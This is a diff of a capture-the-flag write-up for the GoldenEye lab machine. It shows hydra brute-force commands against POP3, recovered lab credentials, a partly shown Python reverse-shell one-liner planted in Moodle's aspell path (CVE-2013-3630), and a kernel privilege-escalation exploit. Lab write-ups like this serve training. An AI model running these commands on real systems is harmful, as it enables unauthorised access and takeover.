@@ -10,9 +10,9 @@ tags:
   - exiftool
 ---
 
-| Difficulty |
-| ---------- |
-|   Medium   |
+| Difficulty |  |  IP Address   |  |
+| :--------: |--| :-----------: |--|
+|   Medium   |  |  10.10.49.24  |  |
 
 ---
 
@@ -84,13 +84,13 @@ PORT      STATE SERVICE  REASON         VERSION
 
 ```
 
-From the nmap results, we can see that there are **4** ports open: **25** (SMTP), **80** (HTTP), **55006** (POP3) and **55007** (POP3) 
+From the nmap results, we can see that there are 4 ports open: **25 (SMTP)**, **80 (HTTP)**, **55006 (POP3)** and **55007 (POP3)** 
 
 Let's take a look at the HTTP Web server:
 
 ![screenshot1](../assets/images/goldeneye/screenshot1.png)
 
-We have a page telling us to navigate to **/sev-home/** in order to login. Let's visit the sub-directory:
+We have a page telling us to navigate to **/sev-home/** in order to login. Let's visit this sub-directory:
 
 ![screenshot2](../assets/images/goldeneye/screenshot2.png)
 
@@ -100,7 +100,7 @@ If we look at the source code of the main page, we find that an interesting scri
 
 ![screenshot3](../assets/images/goldeneye/screenshot3.png)
 
-Looking closely at the **terminal.js** script, we  find a comment that reveals the encoded password of a user called **boris**:
+Looking closely at the terminal.js script, we  find a comment that reveals the encoded password of a user called **boris**:
 
 ![screenshot4](../assets/images/goldeneye/screenshot4.png)
 
@@ -108,17 +108,19 @@ The password has been converted into a [HTML entity](https://www.w3schools.com/h
 
 ![screenshot5](../assets/images/goldeneye/screenshot5.png)
 
-And we've obtained a set of credentials - **boris:InvincibleHack3r**
+And we've obtained a set of credentials:
 
-Now let's navigate to the **/sev-home/** directory again and log in with our newfound credentials.
+> boris : InvincibleHack3r
+
+Now let's navigate to the **/sev-home/** directory again and log in with our newfound credentials:
 
 ![screenshot6](../assets/images/goldeneye/screenshot6.png)
 
-The message on the web page tells us that **POP3** is running on a '**very high non-default port**'. From our nmap scan, we know it is running on ports **55006** and **55007**.
+The message on the web page tells us that **POP3** is running on a 'very high non-default port'. From our nmap scan, we know it is running on ports **55006** and **55007**.
 
 ---
 
-*POP3 is a one-way client-server protocol in which email is received and held on the email server. POP3 is built into most popular email clients, including  Microsoft Outlook.*
+*POP3 is a one-way client-server protocol in which email is received and held on the email server. It is built into most popular email clients, including  Microsoft Outlook.*
 
 ---
 
@@ -137,7 +139,7 @@ Let's now try to connect to the POP3 server. POP3 runs on two different default 
 * **Port 110** - Unencrypted port
 * **Port 995** - Encrypted port
 
-In our case, from our nmap scan, we can see that port **55006** has been configured with **ssl**, while port **55007** has not. Hence, we should connect to port **55007** as it is the unencrypted port.
+In our case, from our nmap scan, we can see that port **55006** has been configured with **SSL**, while port **55007** has not. Hence, we should connect to port **55007** as it is the unencrypted port:
 
 ```
 telnet 10.10.49.24 55007
@@ -145,9 +147,9 @@ telnet 10.10.49.24 55007
 
 ![screenshot8](../assets/images/goldeneye/screenshot8.png)
 
-*A list of POP3 commands can be found [here](https://book.hacktricks.xyz/pentesting/pentesting-pop).*
+*(A list of POP3 commands can be found [here](https://book.hacktricks.xyz/pentesting/pentesting-pop))*
 
-Let's try to reuse boris's credentials from earlier.
+Let's try to reuse boris's credentials from earlier to login into his inbox:
 
 ```
 // in POP3
@@ -159,7 +161,7 @@ PASS InvincibleHack3r
 
 Shoot, authentication failed. Looks like we'll need to do some password brute-forcing! 
 
-Let's use `hydra` with the **fasttrack.txt** wordlist:
+We'll use `hydra` with the [fasttrack.txt](https://github.com/drtychai/wordlists/blob/master/fasttrack.txt) wordlist:
 
 ```
 hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.49.24 pop3
@@ -167,37 +169,39 @@ hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.49.
 
 ![screenshot10](../assets/images/goldeneye/screenshot10.png)
 
-Nice! We've found boris's POP3 password: **secret1!**
+Nice! We've found boris's POP3 password:
+
+> secret1!
 
 We can then authenticate ourselves as boris in POP3:
 
 ![screenshot11](../assets/images/goldeneye/screenshot11.png)
 
-We can use the `LIST` command to list all messages in boris's mailbox:
+We can use the `LIST` command to list all messages in boris's inbox:
 
 ![screenshot12](../assets/images/goldeneye/screenshot12.png)
 
-There are **3** messages. Let's read them with the `RETR` command:
+There are 3 messages. Let's read them with the `RETR` command:
 
-* **MESSAGE 1:**
+* **Message 1:**
 
 ![screenshot13](../assets/images/goldeneye/screenshot13.png)
 
 Nothing of interest here.
 
-* **MESSAGE 2:**
+* **Message 2:**
 
 ![screenshot14](../assets/images/goldeneye/screenshot14.png)
 
-Looks like **natalya** can break boris's codes.
+Looks like natalya can break boris' codes.
 
-* **MESSAGE 3:**
+* **Message 3:**
 
 ![screenshot15](../assets/images/goldeneye/screenshot15.png)
 
 There seems to be some big masterplan in the works... Boris clearly has some access codes that are very important. 
 
-From message 2, we know that **Natalya** has been able to crack Boris's codes. Let's try to see if we can brute-force her POP3 password and log into her account.
+From message 2, we know that **Natalya** has been able to crack Boris's codes. Let's try to see if we can brute-force her POP3 password and log into her account:
 
 ```
 hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.49.24 pop3
@@ -205,7 +209,9 @@ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.4
 
 ![screenshot16](../assets/images/goldeneye/screenshot16.png)
 
-Natalya's password has been found: **bird**
+Natalya's password has been found:
+
+> bird
 
 Let's log into her POP3 account now:
 
@@ -223,9 +229,11 @@ More exposition...
 
 ![screenshot19](../assets/images/goldeneye/screenshot19.png)
 
-Now we're talking! We have a new set of credentials - **xenia:RCP90rulez!**
+Now we're talking! We have a new set of credentials:
 
-We also know that there is a valid sub-directory at **/gnocertdir** and that we should update our **/etc/hosts** file to point the server's IP to **'severnaya-station.com'**
+> xenia : RCP90rulez!
+
+We also know that there is a valid sub-directory at **/gnocertdir** and that we should update our /etc/hosts file to point the server's IP to **'severnaya-station.com'**.
 
 ---
 
@@ -239,17 +247,19 @@ Next, let's visit the **/gnocertdir** directory:
 
 ![screenshot21](../assets/images/goldeneye/screenshot21.png)
 
-We have a learning management system that is running on **moodle**. There is a login button, maybe the credentials in the email will work here?
+We have a learning management system that is running on [moodle](https://moodle.org/). 
+
+There is a login button, maybe the credentials in the email will work there?
 
 ![screenshot22](../assets/images/goldeneye/screenshot22.png)
 
 Yep it works! We are logged in as **xenia**.
 
-If we look at the **messages** sent to xenia, we see one sent by a user called **Dr Doak**.
+If we look at the messages sent to xenia, we see one sent by a user called **Dr Doak**:
 
 ![screenshot23](../assets/images/goldeneye/screenshot23.png)
 
-Dr Doak mentions that his email username is **doak**. Let's try using `hydra` again to brute-force his password:
+Dr Doak mentions that his email username is **doak**. Let's try using `hydra` again to brute-force his POP3 password:
 
 ``` 
 hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.49.24 pop3
@@ -257,15 +267,19 @@ hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f -s 55007 -t 64 10.10.49.2
 
 ![screenshot24](../assets/images/goldeneye/screenshot24.png)
 
-Dr Doak's POP3 password is **goat**. Let's log into his inbox and read his emails.
+Dr Doak's password is:
 
-There is only 1 email in Doak's inbox:
+> goat 
+
+Let's log into his inbox and read his emails. There is only 1 email in his inbox:
 
 ![screenshot25](../assets/images/goldeneye/screenshot25.png)
 
-We've acquired his credentials to the moodle learning site!
+We've acquired his credentials to the moodle learning site:
 
-After logging into Dr Doak's account, I found an interesting file called '**s3cret.txt**' in the '**My private files**' section.
+> dr_doak : 4England!
+
+After logging into Dr Doak's account, I found an interesting file called '**s3cret.txt**' in the 'My private files' section of the site:
 
 ![screenshot26](../assets/images/goldeneye/screenshot26.png)
 
@@ -287,17 +301,19 @@ Next, I used `exiftool` to obtain the metadata for the image:
 
 ![screenshot29](../assets/images/goldeneye/screenshot29.png)
 
-The '**Image Description**' actually contains a **base64-encoded** string!
+The **Image Description** actually contains a base64-encoded string!
 
 ![screenshot30](../assets/images/goldeneye/screenshot30.png)
 
-Decoding the string gives us the admin's password: **xWinter1995x!**
+Decoding the string gives us the admin's password:
+
+> xWinter1995x!
 
 With that, we can now log into the admin's moodle account:
 
 ![screenshot31](../assets/images/goldeneye/screenshot31.png)
 
-The admin's account has more privileges and we can see that we now have an additional '**Site administration**' section on the left.
+The admin's account has more privileges and we see that we now have an additional **Site administration** section on the left.
 
 After doing some research online on how we can exploit this version of moodle (v 2.2.3), I found the following [CVE](https://www.cvedetails.com/cve/CVE-2013-3630/).
 
@@ -309,7 +325,7 @@ After doing some research online on how we can exploit this version of moodle (v
 
 With this, we can open a reverse shell, allowing us to gain a foothold into the target machine.
 
-To carry out the exploit, we need to update the **aspell path** and the **spell engine**. Both of these settings can be found by typing in '**spell**' in the search bar under '**Settings**'.
+To carry out the exploit, we need to update the **aspell path** and the **spell engine**. Both of these settings can be found by typing in 'spell' in the search bar under **Settings**.
 
 * **aspell path**
 
@@ -321,7 +337,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 * **spell engine**
 
-We also make sure to set the **spell engine** to **PSpellShell**.
+We also make sure to set the spell engine to 'PSpellShell'.
 
 ![screenshot33](../assets/images/goldeneye/screenshot33.png)
 
@@ -331,7 +347,7 @@ After setting up a netcat listener, we add a new blog post, then click on the sp
 
 ![screenshot32](../assets/images/goldeneye/screenshot32.png)
 
-The server will then look into the aspell path to identify the binary that it will execute. In our case, it will use Python and run our code, opening a reverse shell.
+The server will then look into the aspell path to identify the binary that it will execute. In our case, it will use Python and run our code, opening a reverse shell:
 
 ![screenshot34](../assets/images/goldeneye/screenshot34.png)
 
@@ -365,21 +381,21 @@ Doing some research online, I came across an existing [exploit](https://www.expl
 
 ---
 
-There was one issue though... The exploit is a C script, but the machine does not have `gcc` installed.
+There was one issue though... The exploit is a C script, but the machine does not have `gcc` installed:
 
 ![screenshot36](../assets/images/goldeneye/screenshot36.png)
 
-Fortunately, it does have `cc`, which is able to compile C code as well. Hence, in order for the exploit to work on the target machine, we have to change all instances of 'gcc' in the exploit to 'cc'.
+Fortunately, it does have `cc`, which is able to compile C code as well. Hence, in order for the exploit to work on the target machine, we have to change all instances of 'gcc' in the exploit to 'cc':
 
 ![screenshot37](../assets/images/goldeneye/screenshot37.png)
 
-Once that was done, I transferred the exploit over to the target machine, compiled it with `cc` to a file called **ofs**, and ran it:
+Once that was done, I transferred the exploit over to the target machine, compiled it with `cc` to a file called 'ofs', and ran it:
 
 ![screenshot38](../assets/images/goldeneye/screenshot38.png)
 
-And we are now root!
+The exploit worked and we are now root!
 
-The root flag can be found in the **/root** directory. Note that it was a hidden file.
+The **root flag** can be found in the /root directory. Note that it was a hidden file:
 
 ![screenshot39](../assets/images/goldeneye/screenshot39.png)
 
@@ -387,6 +403,6 @@ The root flag can be found in the **/root** directory. Note that it was a hidden
 
 ### [ Bonus End Directory ]
 
-Visiting **/006-final/xvf7-flag/** brings us to the following page:
+Visiting **/006-final/xvf7-flag/** on the web server brings us to the following page:
 
 ![screenshot40](../assets/images/goldeneye/screenshot40.png)
